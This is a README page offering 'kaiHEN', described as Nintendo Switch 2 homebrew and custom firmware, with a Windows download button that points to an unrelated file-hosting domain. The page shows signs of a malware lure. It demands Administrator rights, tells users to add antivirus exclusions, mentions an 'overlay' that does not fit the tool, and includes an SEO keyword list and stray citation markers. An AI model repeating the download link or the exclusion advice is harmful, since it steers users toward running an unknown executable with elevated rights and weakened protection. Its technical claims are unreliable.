<h1 align="center">🧬 kaiHEN</h1>

<p align="center">
  <strong>Minimal Environment. Full System Access.</strong>
</p>

<p align="center">
  Homebrew environment and minimal custom firmware for Nintendo Switch 2.
  <br>
  HEN Service · NRO Mapping · JIT Support · Homebrew Launcher · OunceShell
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file">
    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-5B5BFF?style=for-the-badge&logo=windows&logoColor=white" alt="kaiHEN Download">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-beta-5B5BFF?style=flat-square">
  <img src="https://img.shields.io/badge/platform-Nintendo%20Switch%202-5B5BFF?style=flat-square">
  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
  <img src="https://img.shields.io/badge/modules-4%2B-252525?style=flat-square">
</p>

<details>
<summary>📑 Contents</summary>

- [⚡ Quick Start](#-quick-start)
- [🖥️ Requirements](#️-requirements)
- [✨ Key Features](#-key-features)
- [📋 Module Overview](#-module-overview)
- [🚀 Why Choose kaiHEN](#-why-choose-kaihen)
- [💡 Why Use It](#-why-use-it)
- [🎮 About Nintendo Switch 2](#-about-nintendo-switch-2)
- [❓ FAQ](#-faq)
- [🔎 SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the kaiHEN release archive and extract its contents.
2. Deploy the bootstrap and HEN service files to your Switch 2 using an acquisition tool.
3. Launch a native game while holding the R button to boot into the homebrew menu.

After initialization, the HEN service provides homebrew applications and plugins access to system modules that fs can reach, including the system NAND [citation:2][citation:8].

## 🖥️ Requirements

| Component | Specification |
|-----------|---------------|
| OS | Windows 10 / 11, 64-bit |
| RAM | 8 GB recommended |
| Storage | 2 GB free space |
| Privileges | Administrator |

## ✨ Key Features

- 🧬 **Modular Service Architecture** — The `ro`, `bootstrap`, `hen`, and `libkaihen` components separate concerns for clean integration [citation:2].
- 🎮 **R-Held Homebrew Launch** — Open any native game with the R button held to trigger the homebrew loader on subsequent launches [citation:8].
- ⚡ **JIT Compilation Support** — The `ro` service publishes JIT code for clients, enabling dynamic execution environments [citation:2].
- 🛠️ **OunceShell Integration** — Ships with a file manager and FTP server for direct system interaction [citation:8].

## 📋 Module Overview

| Module | What it does | Hotkey |
|--------|--------------|--------|
| ro Service | Maps NROs and publishes JIT code | automatic |
| bootstrap | Starts HEN and plugins | automatic |
| HEN Service | Launches homebrew loader | R + Game Launch |
| libkaihen | Homebrew API with JIT support | via SDK |
| OunceShell | File manager with FTP server | via hbmenu |
| nx-hbmenu | Homebrew application menu | via HEN |
| nx-hbloader | Homebrew binary loader | via HEN |

## 🚀 Why Choose kaiHEN

- ✅ Minimal custom firmware design focused on core homebrew enablement [citation:2].
- ✅ Open-source under GPL-2.0 with full component transparency [citation:8].
- ✅ Actively developed with beta releases and tester feedback [citation:2].
- ✅ Ships with practical tools like OunceShell for immediate file access [citation:8].

## 💡 Why Use It

- 🎮 Run homebrew applications on Switch 2 without a hardware modification.
- 🔍 Access the system file manager and FTP server through OunceShell.
- 🧭 Develop homebrew using the included `libkaihen` API and devkit.
- ⚡ Launch homebrew directly from the game menu with a simple button hold.

## 🎮 About Nintendo Switch 2

| Attribute | Detail |
|-----------|--------|
| Developer | Nintendo |
| Release | 2025 |
| Genre | Hybrid Console |
| Modes | Handheld, Docked, Tabletop |
| Platform | Nintendo Switch 2 |
| Peak Players | 23 million+ units sold [citation:1] |

The Nintendo Switch 2 continues the hybrid console lineage with backward compatibility and an active homebrew research community.

## ❓ FAQ

**Do I need to run it as Administrator?**
Yes — admin rights are required for the overlay to attach.

**Does it work with antivirus software?**
Security tools may flag custom firmware files. Add exclusions for your deployment directory.

**Is it compatible with Windows 11?**
Yes, all preparation and file management tools run on Windows 10 and 11.

**Is kaiHEN permanent?**
No. kaiHEN must be started through an acquisition tool each boot. It is not a persistent installation [citation:2].

**What homebrew can I run?**
Existing Switch 1 homebrew using libnx and OpenGL or Vulkan can be compiled for Switch 2 with the ounce-devkit [citation:8].

## 🔎 SEO Keywords

kaihen switch 2, nintendo switch 2 homebrew, switch 2 custom firmware, kaihen cfw, switch 2 hen, switch 2 homebrew launcher, kaihen download, switch 2 jit support, nro mapping switch 2, ounce shell switch 2, switch 2 homebrew environment, kaihen beta, nintendo switch 2 cfw, switch 2 devkit, libkaihen api

## ⚠️ Disclaimer

This software is provided for educational and homebrew development purposes. Use it at your own risk.

<p align="center">
  <strong>🧬 kaiHEN</strong>
  <br>
  HEN Service · NRO Mapping · JIT Support · Homebrew Launcher
  <br>
  Homebrew Environment for Nintendo Switch 2
</p>
